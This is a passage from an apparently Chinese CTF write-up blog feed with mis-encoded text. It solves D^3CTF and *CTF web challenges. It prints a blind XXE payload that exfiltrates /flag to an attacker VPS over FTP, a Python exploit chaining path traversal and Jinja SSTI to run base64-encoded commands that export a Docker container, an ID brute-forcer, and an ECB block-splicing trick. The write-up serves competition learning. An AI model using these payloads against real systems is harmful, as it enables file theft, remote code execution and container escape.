src="/2021/03/08/2021-D3CTF/IRZvn_IUWBeTQas6Owk9_H8WjyWWDS_I20bWZnyn0lOGG5Br8qCwBWczaNuyTY9igJ5YTYcjWfFtg1iwej3uOtehAJJo17-Dyj4G6iZEF71eBDWlrq-GT62Emnyda78v5_5Jhl-r.png" alt="img"></p><p>è¿”å›é”™è¯¯ã€‚ä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿”å›æ˜¯ xmlã€‚ä¸Šä¼ çš„ client æ˜¯ javaï¼ŒçŒœæµ‹è¿™ä¸ª client ä¼šåœ¨å‘ oss ä¸Šä¼ åè§£æè¿”å›çš„ xml ã€‚</p><p>ç¿»é˜…æºç ï¼Œæœç„¶æœ‰ç›¸å…³çš„æ“ä½œã€‚è€ƒè™‘ xxe æ”»å‡»ï¼Œæˆ‘ä»¬æ§åˆ¶è¿”å›çš„responseåŒ…å« xxe çš„payloadï¼Œä½¿ç”¨ç›²æ‰“xxeã€‚</p><p>ä½¿ç”¨ <a href="https://requestrepo.com/">https://requestrepo.com/</a>ï¼Œæ–¹ä¾¿æ§åˆ¶responseï¼Œresponseçš„ paylaodï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xmlrootname</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps/ext.dtd&quot;</span>&gt;</span>%aaa;%ccc;%ddd;]&gt;</span></span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ä¸Šçš„ ext.dtdï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://vps:2121/%bbb;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/08/2021-D3CTF/Cd_JSMXDgkuTEPvF09sjnvldT5dRBQ4ovtR3ED0IhLEVP6d6_emdQpAm351h-mxnmC6nyj3_5g0HEvDV9zQChhHFMjIT3TfZZgPJcQd6-cjjoWEPvTl-vnbIsEtd2voMTfJTWiaT.png" alt="img"></p><p><img src="/2021/03/08/2021-D3CTF/CamNVR72syzwTWwiRQJ5OyD1S61zzu9gMyqPOJnygEjqDMlY-R-zHKaHOHTKhelAdQ-rIwVo0GbfsoNKmB5htALIrIeEBzx1p9QY28drCfXuTH9GunkBENjRtSiNPxrTpBrVdvdg.png" alt="img"></p><h2 id="Shellgen"><a href="#Shellgen" class="headerlink" title="Shellgen"></a>Shellgen</h2><p>è·Ÿ misc é‚£é“é¢˜é€»è¾‘åŸºæœ¬å·®ä¸å¤šï¼Œå°±æ˜¯éœ€è¦ rceã€‚</p><p>æºä»£ç é‡Œå‘ç°éƒ¨åˆ†ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°pythonå’Œphpçš„æ‰§è¡Œéƒ½æ˜¯åœ¨docker containeré‡Œå®Œæˆçš„ã€‚å…¶ä¸­python ä½¿ç”¨äº† Mount æ¥æŒ‚è½½ç›®å½•ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/f2prKZ6YUJk2oY99Gj2VVPaAbDzGW0DNp072XsKLOPO4oGLKOlq_GcOvRa6zWmO8blk_0vwq0AaN9-XWpAQLqnAsiiqi-oXd6lXK2aHnjeUuXAsxZ4Mzt-bABu4j85zZoJcGkoMw.png" alt="img"></p><p>è¿è¡Œå…¥å®¹å™¨æŒ‡å®šäº† read_onlyã€‚</p><p>æœ¬æ¥ä»¥ä¸ºæŒ‚è½½ç›®å½•åªè¯»ï¼Œå°±æ²¡æƒ³ç”¨è¿™ä¸ªpythonå†™æ–‡ä»¶çš„æ€è·¯ï¼Œä½†æ˜¯åæ¥æœ¬åœ°æµ‹è¯•ä¸€ä¸‹å‘ç°ç«Ÿç„¶å¯ä»¥å†™ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥å¤–éƒ¨hostä¸­ï¼Œè€½è¯¯äº†å¾ˆä¹…ã€‚èµ›åé—®äº†å‡ºé¢˜äººï¼Œè¿™ä¸ªåªæ˜¯root filesystemåªè¯»ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰mountéƒ½åªè¯»ã€‚</p><p>/result å¤„ä½¿ç”¨äº† render_templateï¼Œé‚£ä¹ˆå¦‚æœæ¸²æŸ“çš„result.htmlæ–‡ä»¶å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¢æˆæ­£å¸¸sstiçš„payloadï¼Œå°±å¯ä»¥rceã€‚</p><p>å› ä¸ºåˆ›å»ºç›®å½•æ˜¯ token ç›´æ¥ os.path.join æ‹¼æ¥ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ ../ç©¿è¶Šã€‚éœ€è¦æ³¨æ„ render_template ä¼ å…¥çš„æ¨¡ç‰ˆè·¯å¾„å¦‚æœåŒ…å« <code>..</code> å°±ä¼šæŠ¥é”™ã€‚</p><p>æ•´ä¸ªæ”»å‡»çš„é€»è¾‘æœ‰ç‚¹ç»•ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆæˆ‘ä»¬ token ä¼ å…¥ä¸€ä¸ªéšæœºçš„token: gml/defï¼Œcodeå†™ä»€ä¹ˆéƒ½è¡Œï¼Œsubmitã€‚è¿™æ ·æœåŠ¡å™¨ä¼šåˆ›å»º workdir/gml/def/gen.pyä»¥åŠtemplates/gml/def/result.htmlï¼Œè®°å¾—ä¿ç•™ä¸‹è¿™ä¸ªsessionçš„cookieã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬submitçš„tokenæ˜¯../templates/gmlï¼Œè¿™æ ·æœåŠ¡å™¨ä¼šåˆ›å»º workdir/../templates/gml/gen.pyï¼Œä»¥åŠworkdir/../templates/gml/result.htmlï¼ˆå³ templates/gml/result.htmlï¼‰ã€‚æ³¨æ„è¿™æ—¶mountçš„ç›®å½•æ˜¯ workdir/../templates/gmlï¼Œå³templates/gml -&gt; /optï¼Œé‚£ä¹ˆcodeçš„å†…å®¹å†™æˆå‘ /opt/def/result.html å†™å…¥æ•°æ®ï¼Œè¿™æ ·æˆ‘ä»¬å®é™…æ˜¯å‘æœåŠ¡å™¨çš„ templates/gml/def/result.html å†™å…¥äº†æ•°æ®ã€‚</p><p>ï¼ˆ3ï¼‰æœ€åå¸¦ç€ç¬¬ä¸€æ­¥ä¿ç•™çš„tokenä¸ºgml/def çš„cookie å»è®¿é—® /resultï¼Œè§¦å‘render_templateï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™é‡Œæ¶‰åŠä¸€äº›detail:</p><p>ï¼ˆ1ï¼‰åœ¨ç¬¬ä¸€æ­¥æ—¶ï¼Œæ³¨æ„submitåä¸è¦å¸¦ç€tokenæ˜¯gml/defçš„sessionå»è®¿é—® /result å»checkç»“æœï¼Œå› ä¸º render_template æœ‰ç¼“å­˜ï¼Œåé¢å³ä½¿æˆ‘ä»¬æ›´æ”¹äº† result.htmlï¼Œä¹Ÿä¸ä¼šé‡æ–°æ¸²æŸ“äº†ã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬ä¸€æ­¥submitåï¼Œéœ€è¦ç­‰ä¸€ä¸‹ï¼Œè®©æœåŠ¡å™¨è¿è¡Œå®Œpythonï¼ŒæŠŠresult.htmlå†™å…¥åå†è¿›è¡Œç¬¬äºŒéƒ¨ï¼Œå¦åˆ™å¦‚æœç¬¬äºŒæ­¥å†™å…¥çš„æ¯”ç¬¬ä¸€æ­¥çš„æ—©ï¼Œé‚£ä¹ˆresult.htmlä¼šè¢«ç¬¬ä¸€æ­¥å†™å…¥å†…å®¹è¦†ç›–ã€‚</p><p>ï¼ˆ3ï¼‰ä¹‹æ‰€ä»¥ç¬¬ä¸€æ­¥çš„tokenåŒ…å«äº†ä¸€å±‚è·¯å¾„ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢åé¢å¹²æ‰°ã€‚å‡å¦‚ç¬¬ä¸€æ­¥çš„tokenæ˜¯gmlï¼Œé‚£ä¹ˆç¬¬äºŒæ­¥é‡Œï¼ŒæœåŠ¡å™¨æœ¬èº«å°±ä¼šå‘template/gml/result.htmlé‡Œå†™ï¼Œpythonè„šæœ¬å†å¾€é‡Œå†™ï¼Œå¯èƒ½ä¼šå­˜åœ¨å¹²æ‰°ã€‚ä½†å¦‚æœåŠ äº†ä¸€å±‚è·¯å¾„ï¼Œå°±å¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><p>åœ¨åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œé‡åˆ°äº†å¾ˆå¤šå‘ã€‚æ¯”å¦‚åˆšæ”¾å‡ºè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œæ— è®ºè®©pythonè¾“å‡ºä»€ä¹ˆï¼Œéƒ½è¿”å› detectedï¼Œæ²¡æœ‰è¿‡wrong answerçš„å›æ˜¾ï¼Œç„¶åè¿‡äº†å‡ ä¸ªå°æ—¶ï¼Œå°±å¥½äº†â€¦ åé¢å°è¯•å†™æ–‡ä»¶ï¼Œæ›´ç„å­¦ï¼Œæ„Ÿè§‰é€»è¾‘æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯checkçš„ç»“æœæ˜¾ç¤ºæ²¡å†™è¿›å»ï¼Œå»æ‰¾å‡ºé¢˜äººåé¦ˆï¼Œå‡ºé¢˜äººè¿›é¢˜ç›®ç¯å¢ƒè¯´å·²ç»å†™è¿›å»äº†â€¦ ä¸çŸ¥é“æˆ‘ä»¬è¿™é‡Œä¸ºä»€ä¹ˆè®¿é—® /result check ä¸åˆ°ã€‚</p><p>æœ€åå¹²è„†å†™äº†ä¸ªå¾ªç¯è„šæœ¬ï¼Œä¸€ç›´åœ¨å°è¯•æ”»å‡»ï¼Œpython çš„codeä¹Ÿå†™æˆäº†å¾ªç¯å†™å…¥ï¼Œç»ˆäºæ˜¯åšåˆ°äº†è·‘å‡ æ¬¡èƒ½rceä¸€æ¬¡ï¼ˆåå¼¹shellæ— æœï¼Œcurlä¸pingè¯·æ±‚éƒ½éå¸¸ä¹‹å¡ï¼Œèµ›åé—®äº†ä¸‹æ˜¯é¦™æ¸¯åä»£çš„åŸå› ï¼‰ã€‚</p><p>hintæç¤ºflagåœ¨å¦ä¸€ä¸ªcontaineré‡Œï¼Œä¹Ÿå¼¹ä¸äº†shellï¼Œé¢˜ç›®åˆ äº† docker å‘½ä»¤ï¼Œæ‰€ä»¥ä»¿ç…§é¢˜ç›®ä»£ç ï¼Œä½¿ç”¨dockerclient æ¥ä¸dockeräº¤äº’ï¼Œå‘ç°äº†åä¸º d3ctf-shellgen-flag çš„containerã€‚æ‰§è¡Œä»€ä¹ˆ bashï¼Œshï¼Œpwd å„ç§å‘½ä»¤éƒ½æ˜¾ç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚æœ€åç›´æ¥å†™è„šæœ¬æŠŠè¿™ä¸ªcontaineræ‹–ä¸‹æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random, base64, requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randid</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">10</span>**<span class="number">14</span>, <span class="number">10</span>**<span class="number">15</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = sess.get(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/result&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wait for a sec&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> r.text, time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">py = <span class="string">b&#x27;&#x27;&#x27;from docker import DockerClient, types</span></span><br><span class="line"><span class="string">client = DockerClient()</span></span><br><span class="line"><span class="string">print(client.containers.list())</span></span><br><span class="line"><span class="string">x=client.containers.get(&#x27;d67a893292&#x27;)</span></span><br><span class="line"><span class="string">print(x.id,x.image,x.name,x.status)</span></span><br><span class="line"><span class="string">bits,stat=x.get_archive(&#x27;/&#x27;)</span></span><br><span class="line"><span class="string">print(stat)</span></span><br><span class="line"><span class="string">f=open(&#x27;/tmp/export.tar&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line"><span class="string">for chunk in bits:</span></span><br><span class="line"><span class="string">    f.write(chunk)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | python3&#x27;</span> % base64.b64encode(py).decode()</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | bash | base64&#x27;</span> % base64.b64encode(cmd.encode()).decode()</span><br><span class="line"> </span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(100):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        open(&#x27;/opt/def/result.html&#x27;,&#x27;w&#x27;).write(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;  &#x27;&#x27;&#x27;</span> + cmd + <span class="string">&#x27;&#x27;&#x27; &#x27;).read()\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        pass</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">print(code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">id</span> = randid()</span><br><span class="line">    print(<span class="built_in">id</span>)</span><br><span class="line"> </span><br><span class="line">    s3 = requests.Session()</span><br><span class="line">    s3.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: randid(), <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;pass&#x27;</span>&#125;)</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line">    s1.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="built_in">id</span> + <span class="string">&#x27;/def&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;print(&quot;&lt;?php &quot;,end=&quot;&quot;)&#x27;</span>&#125;)</span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    s2.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="string">&#x27;../templates/&#x27;</span> + <span class="built_in">id</span>, <span class="string">&#x27;code&#x27;</span>: code&#125;)</span><br><span class="line">    a, b = check(s3)</span><br><span class="line">    print(b)</span><br><span class="line">    c, d = check(s1)</span><br><span class="line">    print(d)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Wr0ng&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="comment">#open(&#x27;out.tar&#x27;, &#x27;wb&#x27;).write(base64.b64decode(c))</span></span><br><span class="line">        print(base64.b64decode(c).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹–ä¸‹æ¥æœ¬åœ°å‘ç°æœ‰ä¸ª /getflagï¼Œæ‰§è¡Œå‘ç°éœ€è¦è¾“å…¥tokenï¼Œè¾“å…¥tokenå¾—åˆ°äº† flagï¼Œä½†æ˜¯äº¤ä¸Šå»ä¸å¯¹â€¦</p><p>çŒœæµ‹æ˜¯ä¸æ˜¯å¿…é¡»è¦åœ¨è¿œç¨‹è·‘ï¼Œä½†æ˜¯éœ€è¦è¾“å…¥tokenï¼Œéœ€è¦äº¤äº’ï¼Œæƒ³ç”¨<code>echo xx | /readflag</code>ï¼Œä½†æ˜¯å‘ç° echo éƒ½æ²¡æœ‰ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/telegram-cloud-photo-size-5-6206472350153681829-y.jpg" alt="telegram-cloud-photo-size-5-6206472350153681829-y"></p><p>å°è¯•é€†å‘ç¨‹åºï¼Œå‘ç°ç”Ÿæˆflagçš„é€»è¾‘å¹¶æ²¡æœ‰å¾ˆå¤æ‚ï¼Œæœ¬åœ°ç»“æœå’Œè¿œç¨‹ç»“æœåº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚æœ€åæ‰¾å‡ºé¢˜äººè§£å†³äº†flagé”™è¯¯çš„é—®é¢˜ã€‚</p>]]></content>
    
    
    <summary type="html">D^3CTF &amp; AntCTF é¢˜è§£</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
    
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
    <category term="D^3CTF" scheme="https://igml.top/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>2021 *CTF Web é¢˜è§£</title>
    <link href="https://igml.top/2021/01/19/2021-starctf/"/>
    <id>https://igml.top/2021/01/19/2021-starctf/</id>
    <published>2021-01-19T06:30:02.000Z</published>
    <updated>2021-01-19T07:06:20.067Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºæˆ˜é˜Ÿä¹‹å‰ XCTF æ²¡æ€ä¹ˆå…¨å‘˜æ‰“ï¼Œæ²¡æœ‰é—¨ç¥¨ï¼Œ*CTFæ˜¯æœ€åä¸€æ¬¡å…¥åœºåˆ¸äº†ï¼Œæ‰€ä»¥å‘¨æœ«è·Ÿé˜Ÿå‹å…¨åŠ›æ‰“äº†ä¸‹ *CTFã€‚æœ‰ç‚¹å¯æƒœï¼Œå·®äº†é“ Webï¼ˆèƒŒé”…â€¦</p><p><img src="/2021/01/19/2021-starctf/image-20210118183846729.png" alt="image-20210118183846729"></p><p>å››é“ Webï¼Œæ„Ÿè§‰é™¤äº† betï¼Œå‰©ä¸‹çš„éƒ½ä¸é‚£ä¹ˆ Webâ€¦</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Oh-my-note"><a href="#Oh-my-note" class="headerlink" title="Oh-my-note"></a>Oh-my-note</h2><p>å¼€å§‹ä»¥ä¸º SSTI ä¹‹ç±»çš„ï¼Œè¯•äº†ä¸‹å‘ç°ä¸æ˜¯ã€‚</p><p>é€šè¯»ä»£ç ä¹Ÿæ²¡å•¥ç‚¹ï¼Œæœ‰ä¸ªå¥‡æ€ªçš„åœ°æ–¹å°±æ˜¯ä»¥ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç”¨æˆ·å‘å¸–å­ï¼Œæ²¡æœ‰ç™»é™†çŠ¶æ€â€¦ çŒœæµ‹æ˜¯ä¸æ˜¯é¢˜ç›®å¯åŠ¨æ—¶å€™è‡ªåŠ¨åŠ çš„å¸–å­æœ‰ä¸œè¥¿ã€‚</p><p>æœ‰äº† userid å°±å¯ä»¥çœ‹æ‰€æœ‰å¸–å­äº†ï¼Œçœ‹ä»£ç å‘ç° userid å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼š</p><p><img src="/2021/01/19/2021-starctf/X8zrVVzZLzrH2HYEi8qZUTBqvCv2bp9yMSKCCUf_53DxsMdTx68kq3GnqeME8aZYFxRQkcqK66nwi8SpLJC_iqCiJarpfvOtuX-wgAbkITlpxTb8wpdJPgL4rj1Qv4Jh7DNjL05H-20210118184107665.png" alt="img"></p><p>æ€è·¯å°±æ˜¯æœ‰äº†ä¸‹é¢çš„post_atï¼Œåœ¨é™„è¿‘å»çˆ†ç ´ä¸€ä¸‹å‰é¢çš„timestampï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°user_idäº†ï¼Œç„¶åå¯ä»¥æŸ¥çœ‹å‰é¢é‚£å‡ ä¸ªuserçš„æ–‡ç« ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, datetime</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post_at = <span class="string">&quot;2021-01-15 02:29 UTC&quot;</span></span><br><span class="line">timeArray = time.strptime(post_at, <span class="string">&quot;%Y-%m-%d %H:%M UTC&quot;</span>)</span><br><span class="line">init = <span class="built_in">int</span>(time.mktime(timeArray) - time.mktime(time.gmtime(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># print(init)</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">-20</span>,<span class="number">20</span>):</span><br><span class="line">    timestamp = init - j</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        tmp = <span class="built_in">round</span>(i / <span class="number">10000</span>, <span class="number">4</span>)</span><br><span class="line">        res = timestamp + tmp</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        random.seed(res)</span><br><span class="line">        user_id = get_random_id()</span><br><span class="line">        random.seed(user_id + post_at)</span><br><span class="line">        note_id = get_random_id()</span><br><span class="line">        <span class="comment"># print(note_id)</span></span><br><span class="line">        <span class="keyword">if</span> note_id == <span class="string">&#x27;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#x27;</span>:</span><br><span class="line">            print(user_id)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸‹æ—¶åŒºé—®é¢˜ï¼Œæœ‰äº† useridï¼Œnoteé‡Œæœ‰ flagï¼š</p><img src="/2021/01/19/2021-starctf/uJAfYewzt3kIUrDpkRYuGOq-N6Jz4OAkZz2JYqrLa-lXBiLfRRSomaTKpMUiPhht5W9IkM-V2MCmfGmqGcXuHPFcB10p2fvolci7NeRyryypPyvaisvwVktpem6sBQX46QarnoBh.png" alt="img" style="zoom:50%;"><h2 id="lottery-again"><a href="#lottery-again" class="headerlink" title="lottery again"></a>lottery again</h2><p>2020 0CTFåˆèµ›æ”¹çš„ï¼ŒåŠŸèƒ½é€»è¾‘æ²¡æ”¹ï¼Œå½“æ—¶é¢˜è§£ï¼š<a href="http://igml.top/2020/06/29/2020-TCTF-0CTF/#lottery">http://igml.top/2020/06/29/2020-TCTF-0CTF/#lottery</a> </p><p>2020 0CTFæ”¹çš„ï¼Œå‘ç°é€»è¾‘å‡ ä¹éƒ½æ²¡å˜ï¼Œå…³é”®æ˜¯åŠ å¯†ç®—æ³•å˜äº†ã€‚<code>mcrypt_encrypt(MCRYPT_RIJNDAEL_256, env(&#39;LOTTERY_KEY&#39;), $serilized, MCRYPT_MODE_ECB)</code>è¿™ä¸æ˜¯æ­£å¸¸çš„AESï¼Œå¯†é’¥éœ€è¦32å­—èŠ‚ï¼Œå¹¶ä¸”æ˜æ–‡32å­—èŠ‚ä¸ºä¸€ç»„ã€‚</p><p>æ˜æ–‡æŒ‰ç…§32å­—èŠ‚åˆ†ç»„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lottery&quot;</span>:<span class="string">&quot;56505c44-f0d3-492a-b</span></span><br><span class="line"><span class="string">12b-0fa6bfc93c65&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edce28</span></span><br><span class="line"><span class="string">e4-bfea-41c5-8cc5-ec55104b745b&quot;</span>,</span><br><span class="line"><span class="attr">&quot;coin&quot;</span>:<span class="number">19</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åŠ ä¸€ä¸ªç¬¬äºŒä¸ªåˆ†ç»„ï¼Œææˆè¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lottery&quot;</span>:<span class="string">&quot;56505c44-f0d3-492a-b</span></span><br><span class="line"><span class="string">12b-0fa6bfc93c65&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edce28</span></span><br><span class="line"><span class="string">xxxxxxxxxxxxxxxx&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edca28</span></span><br><span class="line"><span class="string">e4-bfea-41c5-8cc5-ec55104b745b&quot;</span>,</span><br><span class="line"><span class="attr">&quot;coin&quot;</span>:<span class="number">19</span>&#125;</span><br></pre></td></tr></table></figure><p>json_loadsæ—¶ï¼Œç¬¬äºŒä¸ªuserä¼šè¦†ç›–æ‰å‰é¢çš„ï¼Œè¿™æ ·åé¢çš„useræˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶ï¼ŒæŠŠé’±éƒ½è½¬åˆ°ä¸€ä¸ªè´¦æˆ·å°±è¡Œäº†ã€‚</p><p>ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œå†™äº†ä¸ªå¤šè¿›ç¨‹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 